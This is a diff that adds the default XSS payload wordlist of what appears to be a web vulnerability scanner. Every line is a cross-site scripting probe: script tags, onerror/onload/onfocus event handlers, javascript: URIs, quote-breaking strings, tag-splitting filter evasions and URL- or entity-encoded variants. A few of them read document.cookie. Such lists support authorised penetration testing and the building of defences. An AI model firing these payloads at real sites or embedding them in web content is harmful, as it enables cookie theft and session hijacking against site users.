@@ -1,0 +1,35 @@
+# XSS Payloads — Built-in Default List
+# Add your own by creating wordlists/custom/xss_custom.txt
+<script>alert(1)</script>
+<script>alert(document.domain)</script>
+<img src=x onerror=alert(1)>
+<img src=x onerror=alert(document.cookie)>
+<svg onload=alert(1)>
+<svg/onload=alert(1)>
+<details open ontoggle=alert(1)>
+<video src=x onerror=alert(1)>
+<audio src=x onerror=alert(1)>
+<body onload=alert(1)>
+<input onfocus=alert(1) autofocus>
+<select onfocus=alert(1) autofocus>
+<textarea onfocus=alert(1) autofocus>
+<keygen onfocus=alert(1) autofocus>
+javascript:alert(1)
+javascript:alert(document.cookie)
+'><script>alert(1)</script>
+"><script>alert(1)</script>
+"--><script>alert(document.domain)</script>
+';alert(1)//
+\";alert(1)//
+</script><script>alert(1)</script>
+<scr<script>ipt>alert(1)</scr</script>ipt>
+%3Cscript%3Ealert(1)%3C/script%3E
+&#60;script&#62;alert(1)&#60;/script&#62;
+<math><mtext></table></p><script>alert(1)</script>
+<iframe src="javascript:alert(1)">
+<object data="javascript:alert(1)">
+<embed src="javascript:alert(1)">
+<a href="javascript:alert(1)">click me</a>
+<form><button formaction=javascript:alert(1)>X</button>
+onmouseover=alert(1)
+onfocusin=alert(1)
